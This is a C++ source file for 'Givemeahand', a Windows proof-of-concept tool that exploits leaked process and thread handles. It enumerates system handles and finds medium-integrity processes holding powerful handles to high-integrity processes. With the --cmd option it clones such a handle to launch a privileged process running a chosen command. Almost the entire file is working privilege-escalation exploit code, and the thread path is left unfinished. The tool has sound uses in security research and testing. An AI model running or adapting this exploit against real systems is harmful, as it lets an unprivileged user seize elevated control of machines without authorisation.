// Givemeahand.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <iostream>
#include <winternl.h>
#include <TlHelp32.h>
#include <map>
#include <resource.h>
#include <vector>

#include "support.h"
#include "utils.h"

using fNtQuerySystemInformation = NTSTATUS(WINAPI*)(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);

//https://stackoverflow.com/questions/865668/parsing-command-line-arguments-in-c
map<wstring, wstring> ParseArguments(int argc, wchar_t* argv[])
{
	map<wstring, wstring> args;
	for (int i = 1; i < argc; i++) {
		if (argv[i][0] == '-') {
			const wstring key = argv[i];
			wstring value = L"";
			if (i + 1 < argc && argv[i + 1][0] != '-') {
				value = wstring(argv[i + 1]);
				i++;
			}
			args[key] = value;
		}
	}
	return args;
}

void PrintUsage()
{
	cout << "Givemeahand: A PoC tool for exploiting leaked process and thread handles\n"
		"Heavily inspired by:"
		"\thttps://aptw.tf/2022/02/10/leaked-handle-hunting.html\n"
		"\thttp://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/\n"
		"\n"
		"Example usage:\n"
		"\t.\\Givemeahand\n"
		"\t.\\Givemeahand --cmd \"C:\\Windows\\System32\\cmd.exe /c calc.exe\"\n";
}

int wmain(int argc, wchar_t* argv[], wchar_t* envp[])
{
	map<wstring, wstring> args = ParseArguments(argc, argv);

	if (args.count(L"-h") || args.count(L"--help")) {
		PrintUsage();
		return 0;
	}

	NTSTATUS queryInfoStatus = 0;
	fNtQuerySystemInformation NtQuerySystemInformation = (fNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll"), "NtQuerySystemInformation");
	PSYSTEM_HANDLE_INFORMATION tempHandleInfo = nullptr;
	size_t handleInfoSize = 0x10000;
	auto handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
	if (handleInfo == NULL) return 1;

	std::map<HANDLE, DWORD> mHandleId;

	wil::unique_handle snapshot(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0));
	PROCESSENTRY32W processEntry = { 0 };
	THREADENTRY32 threadEntry = { 0 };
	processEntry.dwSize = sizeof(PROCESSENTRY32W);
	threadEntry.dwSize = sizeof(THREADENTRY32);

	// start enumerating from the first process
	auto status = Process32FirstW(snapshot.get(), &processEntry);

	// start iterating through the PID space and try to open existing processes and map their PIDs to the returned shHandle
	std::cout << "[*] Creating PIDs/TIDs->Handle map ...\n";
	do
	{
		auto hTempHandle = OpenProcess(MAXIMUM_ALLOWED, FALSE, processEntry.th32ProcessID);
		if (hTempHandle != NULL)
		{
			// if we manage to open a shHandle to the process, insert it into the HANDLE - PID map at its PIDth index
			mHandleId.insert({ hTempHandle, processEntry.th32ProcessID });
		}
		else {
			if (args.count(L"--debug"))
				cerr << "[.] Failed to open process "
				<< processEntry.th32ProcessID
				<< " (" << GetLastError() << ")\n";
		}
	} while (Process32NextW(snapshot.get(), &processEntry));

	// start enumerating from the first thread
	// TODO: Implement thread handle exploitation
	status = Thread32First(snapshot.get(), &threadEntry);
	do
	{
		auto hTempHandle = OpenThread(THREAD_QUERY_LIMITED_INFORMATION, FALSE, threadEntry.th32ThreadID);
		if (hTempHandle != NULL)
		{
			// if we manage to open a shHandle to the process, insert it into the HANDLE - PID map at its PIDth index
			mHandleId.insert({ hTempHandle, threadEntry.th32OwnerProcessID });
		}
		else {
			if (args.count(L"--debug"))
				cerr << "[.] Failed to open thread " <<
				threadEntry.th32OwnerProcessID
				<< " (" << threadEntry.th32ThreadID << ") "
				<< " [" << GetLastError() << "]\n";
		}
	} while (Thread32Next(snapshot.get(), &threadEntry));

	std::cout << "[*] Populating handleInfo ...\n";

	while (queryInfoStatus = NtQuerySystemInformation(
		(SYSTEM_INFORMATION_CLASS)SystemHandleInformation, //0x10
		handleInfo,
		static_cast<ULONG>(handleInfoSize),
		NULL
	) == 0xC0000004)
	{
		tempHandleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(handleInfo, handleInfoSize *= 2);
		if (tempHandleInfo == NULL) return 1;
		else handleInfo = tempHandleInfo;
	}

	std::cout << "[*] Filtering handles ...\n";
	std::map<uint64_t, HANDLE> mAddressHandle;
	DWORD pid = GetCurrentProcessId();
	for (uint32_t i = 0; i < handleInfo->HandleCount; i++)
	{
		auto handle = handleInfo->Handles[i];
		// skip handles not belonging to this process
		if (handle.UniqueProcessId != pid)
			continue;
		else
		{
			// switch on the type of object the handle refers to
			switch (handle.ObjectTypeNumber)
			{
			case OB_TYPE_INDEX_PROCESS:
			{
				mAddressHandle.insert({ (uint64_t)handle.Object, (HANDLE)handle.HandleValue }); // fill the ADDRESS - HANDLE map 
				break;
			}
			case OB_TYPE_INDEX_THREAD:
			{
				mAddressHandle.insert({ (uint64_t)handle.Object, (HANDLE)handle.HandleValue }); // fill the ADDRESS - HANDLE map
				break;
			}

			default:
				continue;
			}
		}
	}
	if (mAddressHandle.size() == 0)
	{
		std::cerr << "[-] No process handle matched the required criteria\n";
		return 1;
	}

	std::cout << "[*] Looking for vulnerable handles ...\n";
	std::vector<SYSTEM_HANDLE_TABLE_ENTRY_INFO> vSysHandle;
	for (uint32_t i = 0; i < handleInfo->HandleCount; i++) {
		auto handle = handleInfo->Handles[i];
		DWORD currentPid = handle.UniqueProcessId;
		if (currentPid == pid) continue; // skip our process' handles
		DWORD integrityLevel = GetTargetIntegrityLevel(currentPid);

		if (
			integrityLevel != 0 &&
			integrityLevel < SECURITY_MANDATORY_HIGH_RID // the integrity level of the process must be < High
			)
		{
			if (handle.ObjectTypeNumber != OB_TYPE_INDEX_PROCESS &&
				handle.ObjectTypeNumber != OB_TYPE_INDEX_THREAD) continue;

			if (handle.ObjectTypeNumber == OB_TYPE_INDEX_PROCESS) {
				if (!(handle.GrantedAccess == PROCESS_ALL_ACCESS ||
					handle.GrantedAccess & PROCESS_CREATE_PROCESS ||
					handle.GrantedAccess & PROCESS_CREATE_THREAD ||
					handle.GrantedAccess & PROCESS_DUP_HANDLE ||
					handle.GrantedAccess & PROCESS_VM_WRITE)) continue;
			}

			if (handle.ObjectTypeNumber == OB_TYPE_INDEX_THREAD) {
				if (!(handle.GrantedAccess == THREAD_ALL_ACCESS ||
					handle.GrantedAccess & THREAD_DIRECT_IMPERSONATION ||
					handle.GrantedAccess & THREAD_SET_CONTEXT)) continue;
			}

			auto address = (uint64_t)(handle.Object);
			auto foundHandlePair = mAddressHandle.find(address);
			DWORD handleIntegrityLevel;
			if (foundHandlePair != mAddressHandle.end()) {
				auto foundHandle = foundHandlePair->second;
				auto handlePidPair = mHandleId.find(foundHandle);
				auto handlePid = handlePidPair->second;
				handleIntegrityLevel = GetTargetIntegrityLevel(handlePid);
			}
			else {
				if (handle.ObjectTypeNumber == OB_TYPE_INDEX_PROCESS)
					handleIntegrityLevel = SECURITY_MANDATORY_HIGH_RID;
				else
					handleIntegrityLevel = 0;
			}

			if (
				handleIntegrityLevel != 0 &&
				handleIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID // the integrity level of the target must be >= High
				)
			{
				vSysHandle.push_back(handle); // save the interesting handles
				std::wcout << "[*] Process: " << GetProcName(currentPid) << " (" << std::dec << currentPid << ")" << "\n\t"
					<< "|_ Handle value: 0x" << std::hex << static_cast<uint64_t>(handle.HandleValue) << "\n\t"
					<< "|_ Object address: 0x" << std::hex << reinterpret_cast<uint64_t>(handle.Object) << "\n\t"
					<< "|_ Object type: 0x" << std::hex << static_cast<uint32_t>(handle.ObjectTypeNumber) << "\n\t"
					<< "|_ Access granted: 0x" << std::hex << static_cast<uint32_t>(handle.GrantedAccess) << "\n\t"
					<< "|_ Integrity level: 0x" << std::hex << static_cast<uint32_t>(integrityLevel) << std::endl;

				if (args.count(L"--cmd")) {
					if (handle.ObjectTypeNumber == OB_TYPE_INDEX_PROCESS) {
						if ((handle.GrantedAccess == PROCESS_ALL_ACCESS ||
							handle.GrantedAccess & PROCESS_CREATE_PROCESS)) {
							HANDLE clHandle;
							if (!CloneHandle(handle.UniqueProcessId, (HANDLE)handle.HandleValue, &clHandle)) {
								std::cerr << "[-] CloneHandle failed";
							}
							DWORD privPid = CreatePrivProc(
								&clHandle,
								(WCHAR*)args.find(L"--cmd")->second.c_str());
							if (privPid == 0) {
								std::cerr << "[-] CreatePrivProc failed";
							}
							else {
								std::cerr << "[!] Privileged process launched with PID " << privPid << "\n";
								/*return 0;*/
							}
						}
					}
				}
			}
		}
	}
	std::cout << "[" << (vSysHandle.size() > 0 ? "!" : "*") << "] Found " << vSysHandle.size() << " potentially vulnerable handles\n";
	std::cout << "[*] Done\n";
}
